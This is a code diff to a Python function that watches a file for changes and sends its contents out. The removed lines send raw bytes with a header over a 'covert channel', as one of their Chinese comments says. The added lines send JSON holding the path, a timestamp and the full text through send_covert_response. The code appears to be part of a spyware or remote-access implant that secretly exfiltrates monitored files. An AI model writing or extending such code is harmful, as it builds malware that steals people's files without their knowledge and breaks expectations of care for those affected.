@@ -185,22 +185,20 @@ def monitor_file(path):
             break
         if mtime != last_mtime:
             last_mtime = mtime
-
-            # 1. 读取最新的完整二进制内容
+            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
             try:
-                with open(path, 'rb') as f:
-                    file_bytes = f.read()
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
             except Exception as e:
-                err = f"ERROR reading file: {e}".encode()
-                send_covert_response(b"FILE_TRANSFER_ERROR:" + os.path.basename(path).encode() + b":" + err)
-                continue
+                content = f"<ERROR reading file: {e}>"
 
-            # 2. 构造 header：FILE_TRANSFER:<basename>:
-            basename = os.path.basename(path)
-            header = f"FILE_TRANSFER:{basename}:".encode()
-
-            # 3. 通过隐蔽通道一次性发出 header + 二进制文件
-            send_covert_response(header + file_bytes)
+            msg = {
+                "type": "MON_FILE_MODIFIED",
+                "path": path,
+                "timestamp": ts,
+                "content": content
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
 
         time.sleep(1)
     # When mon_file_path is changed (stop or new path), thread will exit.
